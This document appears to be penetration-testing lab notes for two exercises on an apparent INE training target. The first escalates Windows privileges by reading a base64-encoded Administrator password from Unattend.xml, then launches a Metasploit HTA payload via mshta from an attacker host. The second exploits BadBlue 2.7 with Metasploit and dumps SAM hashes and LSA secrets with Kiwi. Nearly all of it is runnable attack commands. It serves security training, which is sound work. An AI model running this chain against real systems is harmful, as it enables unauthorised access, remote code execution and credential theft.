#### Windows Privilege Escalation Using Unattend.xml Credentials

##### Run the PowerUp Audit

```
cd .\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

Discovered file:

```
C:\Windows\Panther\Unattend.xml
```

##### Extract the Encoded Administrator Password

```
Get-Content C:\Windows\Panther\Unattend.xml
```

Encoded password:

```
QWRtaW5AMTIz
```

##### Decode the Password

```
$password = "QWRtaW5AMTIz"
$password = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($password)
)
$password
```

Decoded credentials:

```
Administrator:Admin@123
```

##### Start an Administrator Command Prompt

```
runas.exe /user:administrator cmd
```

Enter:

```
Admin@123
```

Verify access:

```
whoami
```

##### Start the Metasploit HTA Server

```
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

##### Execute the HTA Payload as Administrator

Use the generated Metasploit URL:

```
mshta.exe http://<KALI_IP>:8080/<HTA_FILE>.hta
```

##### Access the Meterpreter Session

```
sessions
sessions -i <SESSION_ID>
getuid
```

#### BadBlue 2.7 Exploitation and Credential Dumping with Kiwi

##### Check Target Connectivity

```
ping -c 4 demo.ine.local
```

##### Scan the Target

```
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
```

Detected service:

```
BadBlue 2.7
```

##### Search for a BadBlue Exploit

```
searchsploit badblue 2.7
```

##### Exploit the BadBlue Server

```
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

##### Migrate to the LSASS Process

```
migrate -N lsass.exe
```

##### Load the Kiwi Extension

```
load kiwi
```

##### Extract Available Credentials

```
creds_all
```

##### Dump Local Account Hashes

```
lsa_dump_sam
```

##### Dump LSA Secrets

```
lsa_dump_secrets
```